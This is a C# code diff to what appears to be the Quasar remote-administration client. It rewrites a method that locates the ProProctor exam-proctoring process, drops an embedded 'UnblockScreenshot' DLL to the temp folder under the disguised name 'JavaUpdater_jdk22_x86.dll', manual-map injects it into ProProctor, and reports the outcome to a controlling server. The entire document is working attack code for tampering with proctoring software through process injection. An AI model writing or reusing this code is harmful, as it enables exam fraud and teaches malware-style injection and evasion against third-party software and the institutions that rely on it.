@@ -347,12 +347,37 @@ namespace Quasar.Client.Messages
 
         private void UnblockProproctor(ISender client)
         {
-            string stdStr = "";
-            bool result = DllInjectionHelper.InjectNormalUnblockDll("ProProctor", "JavaUpdater_jdk22", client, out stdStr);
-            if (stdStr == "") stdStr = "OK";
-            if (result)
+            Process[] processes = Process.GetProcessesByName("ProProctor");
+
+            string dllPath = "";
+            if (processes.Length == 0)
             {
-                client.Send(new NotifyMessageToServer { Message = "Injection result: " + stdStr });
+                client.Send(new NotifyMessageToServer { Message = "Can't find ProProctor.exe process" });
+                return;
+            }
+            byte[] proproctorDll_x86 = Resource1.UnblockScreenshot_x86;
+            dllPath = Path.Combine(new string[]
+            {
+                    Path.GetTempPath(),
+                    "JavaUpdater_jdk22_x86.dll"
+            });
+            try
+            {
+                File.WriteAllBytes(dllPath, proproctorDll_x86);
+            }
+            catch (Exception ex5)
+            {
+                client.Send(new NotifyMessageToServer { Message = string.Format("{0}:\n\n{1}", "Writing 32bit ProProctor injection dll error", ex5.Message) });
+            }
+            try
+            {
+                string[] ss = DllInjectionHelper.InjectManualMap("ProProctor", dllPath, true);
+                string combinedString = string.Join("\n", ss);
+                client.Send(new NotifyMessageToServer { Message = "ProProctor injection result:\n" + combinedString });
+            }
+            catch (Exception ex6)
+            {
+                client.Send(new NotifyMessageToServer { Message = string.Format("error injection to ProProctor: {0}", ex6.Message) });
             }
         }
     }
